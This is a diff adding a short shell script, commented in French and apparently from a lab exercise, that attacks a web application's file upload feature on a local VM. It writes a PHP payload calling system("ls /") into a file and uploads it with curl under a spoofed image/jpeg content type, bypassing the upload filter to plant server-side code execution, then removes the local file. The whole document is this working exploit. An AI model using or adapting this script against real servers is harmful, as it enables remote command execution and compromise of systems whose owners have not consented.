@@ -1,0 +1,14 @@
+  GNU nano 7.2                                                                                                       script.sh                                                                                                                
+vm_ip=192.168.1.16
+
+# 1. Créer le fichier avec le payload PHP
+echo '<?php system("ls /"); ?>' > inject.txt
+
+# 2. Exécuter la commande d'upload
+curl -s --form "Upload=send" \
+--header "Content-Type: multipart/form-data" \
+--form "uploaded=@inject.txt;type=image/jpeg" \
+http://$vm_ip/?page\=upload
+
+# 3. Nettoyer
+rm inject.txt
